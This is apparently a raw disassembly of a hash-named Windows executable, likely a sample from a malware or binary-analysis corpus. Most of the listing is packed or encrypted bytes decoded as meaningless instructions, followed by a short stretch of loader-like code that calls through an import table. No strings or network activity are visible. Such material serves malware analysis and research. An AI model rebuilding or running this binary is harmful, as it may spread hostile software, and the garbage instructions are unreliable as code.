
cfd25ede15775f520ff7ca4a33b432527f23d1aaf853e31cea9effa288d58b0a.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	jge    0x4d006e
  4d0002:	(bad)  
  4d0003:	out    0xb7,al
  4d0005:	shl    DWORD PTR [esp+ebp*2-0x60f48e2d],1
  4d000c:	xor    eax,0xb471aaa5
  4d0011:	pop    ecx
  4d0012:	aad    0x77
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d065f
  4d06c1:	lock or eax,0x1ee46ac2
  4d06c7:	adc    esp,DWORD PTR [ecx]
  4d06c9:	inc    edi
  4d06ca:	in     al,dx
  4d06cb:	or     ebx,DWORD PTR [esi]
  4d06cd:	jne    0x4d068c
  4d06cf:	pop    esp
  4d06d0:	dec    esi
  4d06d1:	cmc    
  4d06d2:	popa   
  4d06d3:	fucom  st(4)
  4d06d5:	lods   eax,DWORD PTR ds:[esi]
  4d06d6:	inc    ebp
  4d06d7:	jp     0x4d06e4
  4d06d9:	fstp   DWORD PTR [esi]
  4d06db:	inc    edx
  4d06dc:	ins    DWORD PTR es:[edi],dx
  4d06dd:	jne    0x4d073b
  4d06df:	push   edx
  4d06e0:	stc    
  4d06e1:	ds mov dl,0x3b
  4d06e4:	jnp    0x4d06dc
  4d06e6:	not    BYTE PTR [esi+eiz*2+0x5f3dc11a]
  4d06ed:	call   DWORD PTR ds:0x4d2044
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d2030
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0709:	sub    esp,0x48
  4d070c:	mov    edi,0x4d31e0
  4d0711:	cmp    edi,0x3c2d
  4d0717:	je     0x4d0707
  4d0719:	push   edi
  4d071a:	call   0x4d0f58
  4d071f:	add    esp,0x4
  4d0722:	pop    edi
  4d0723:	push   edi
  4d0724:	push   DWORD PTR [edi+0x194]
  4d072a:	push   DWORD PTR [edi+0xf0]
  4d0730:	push   DWORD PTR [edi+0x1a4]
  4d0736:	push   DWORD PTR [edi+0x10]
  4d0739:	call   0x4d1150
  4d073e:	add    esp,0x10
  4d0741:	pop    edi
  4d0742:	mov    eax,0x4d2028
  4d0747:	mov    eax,DWORD PTR [eax]
  4d0749:	push   eax
  4d074a:	push   DWORD PTR [edi-0xec]
  4d0750:	pop    esi
  4d0751:	call   esi
  4d0753:	add    esp,0x48
  4d0756:	pop    ebp
  4d0757:	ret    
  4d0758:	pop    edi
  4d0759:	call   DWORD PTR ds:0x4d2014
  4d075f:	call   edi
  4d0761:	add    BYTE PTR [eax],al
  4d0763:	add    BYTE PTR [edi-0x1],bl
  4d0766:	adc    eax,0x4d208c
  4d076b:	call   edi
  4d076d:	add    BYTE PTR [eax],al
  4d076f:	add    BYTE PTR [edi-0x1],bl
  4d0772:	adc    eax,0x4d2034
  4d0777:	call   edi
  4d0779:	add    BYTE PTR [eax],al
  4d077b:	add    BYTE PTR [edi-0x1],bl
  4d077e:	adc    eax,0x4d2028
  4d0783:	call   edi
  4d0785:	add    BYTE PTR [eax],al
  4d0787:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d078d:	sub    esp,0x3c
  4d0790:	mov    esi,0x4d3110
